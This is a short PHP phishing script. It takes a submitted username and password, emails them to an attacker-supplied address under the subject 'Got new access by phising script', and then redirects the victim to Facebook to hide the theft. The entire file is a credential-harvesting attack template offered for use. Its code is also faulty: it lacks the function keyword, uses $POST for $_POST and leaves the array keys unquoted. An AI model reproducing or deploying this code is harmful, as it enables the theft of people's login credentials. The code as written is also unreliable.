<?php
	mail_sender(){
		$username = $POST[username];
		$password = $POST[password];
		$reciever = "YOUR-EMAIL ADRRESS";
		$subject = "Got new access by phising script";
		$message = "The username is ". $username;
		$message .= "and password is ". $password;
		$sent =  mail($reciever, $subject, $message);
		if($sent == true) return true;
		 else return false;
	}
	
	if(mail_sender()){
		header("Location: http://www.facebook.com");
	}
?>
